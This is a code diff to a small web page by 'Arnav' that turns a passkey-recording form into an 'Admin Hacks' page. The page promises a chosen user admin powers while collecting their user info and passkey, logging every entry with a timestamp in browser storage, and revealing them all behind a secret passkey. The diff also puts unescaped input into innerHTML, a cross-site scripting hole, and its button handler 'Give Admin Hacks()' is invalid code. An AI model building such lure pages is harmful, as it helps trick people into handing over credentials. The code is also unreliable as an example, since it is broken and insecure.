@@ -1,10 +1,9 @@
-
-        <!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Record Data with Secret Passkey</title>
+    <title>Admin Hacks</title>
     <style>
         #searchingMessage {
             display: none;
@@ -23,17 +22,25 @@
         #displayDataBtn {
             display: none; /* Initially hidden */
         }
+
+        .data-entry {
+            margin-bottom: 10px;
+            padding: 10px;
+            background-color: #f1f1f1;
+            border-radius: 5px;
+            border: 1px solid #ccc;
+        }
     </style>
 </head>
 <body>
 
-    <h1>Press to record <input type="text" id="username" name="username"> (selected user) data</h1>
+    <h1>Press to Give <input type="text" id="username" name="username"> (selected user) Admin Hacks</h1>
     <p>
         USER INFO: <input type="text" id="Passkey1" name="Passkey">
         Passkey: <input type="text" id="Passkey2" name="Passkey">
     </p>
 
-    <button onclick="recordData()">RECORD DATA</button>
+    <button onclick="Give Admin Hacks()">RECORD DATA</button>
     <br>
     <p>Enter secret passkey to display data:</p>
     <input type="text" id="secretPasskey" placeholder="Enter secret passkey">
@@ -45,7 +52,7 @@
     <div id="searchingMessage">Searching...</div>
 
     <h3>Stored Data:</h3>
-    <pre id="storedData"></pre>
+    <div id="storedData"></div> <!-- The data will be displayed here -->
 
     <script>
         // Secret passkey (this can be any passkey you want)
@@ -68,14 +75,21 @@
                 const data = {
                     username: username,
                     passkey1: passkey1,
-                    passkey2: passkey2
+                    passkey2: passkey2,
+                    timestamp: new Date().toLocaleString() // Add a timestamp for when the data was recorded
                 };
 
-                // Save the data to local storage
-                localStorage.setItem('userData', JSON.stringify(data));
+                // Retrieve the current stored data (if any)
+                let storedData = JSON.parse(localStorage.getItem('userData')) || [];
+
+                // Add the new data to the stored data array
+                storedData.push(data);
+
+                // Save the updated data back to local storage
+                localStorage.setItem('userData', JSON.stringify(storedData));
 
                 // Show a success message
-                alert('Data has been recorded successfully!');
+                alert('admin hacks given');
             }, 3000);  // 3 seconds delay
         }
 
@@ -95,24 +109,40 @@
         // Function to display the stored data
         function displayData() {
             // Retrieve data from local storage
-            const storedData = localStorage.getItem('userData');
+            const storedData = JSON.parse(localStorage.getItem('userData')) || [];
 
-            if (storedData) {
-                // Parse the string back into an object
-                const parsedData = JSON.parse(storedData);
+            const storedDataContainer = document.getElementById('storedData');
+            storedDataContainer.innerHTML = ''; // Clear any previous data displayed
 
-                // Display the stored data
-                document.getElementById('storedData').textContent = JSON.stringify(parsedData, null, 2);
+            if (storedData.length > 0) {
+                // Loop through the stored data and create a list of entries
+                storedData.forEach((data, index) => {
+                    // Create a div for each entry
+                    const dataDiv = document.createElement('div');
+                    dataDiv.classList.add('data-entry');
+
+                    // Display the data (with a timestamp)
+                    dataDiv.innerHTML = `
+                        <strong>Entry #${index + 1}</strong><br>
+                        Username: ${data.username}<br>
+                        Passkey 1: ${data.passkey1}<br>
+                        Passkey 2: ${data.passkey2}<br>
+                        <small>Recorded at: ${data.timestamp}</small>
+                    `;
+
+                    // Append the entry to the display container
+                    storedDataContainer.appendChild(dataDiv);
+                });
             } else {
                 // If no data is found, show a message
-                document.getElementById('storedData').textContent = 'No data found in local storage.';
+                storedDataContainer.innerHTML = 'No data found in local storage.';
             }
         }
     </script>
 
     <p>Tool Created By Arnav.</p>
     <br>
-    <p style="color:#FF0000">WARNING: Data will be permanently deleted!</p>
+    <p style="color:#FF0000">WARNING: Unauthorized use is strictly prohibited!</p>
     </br>
 
 </body>
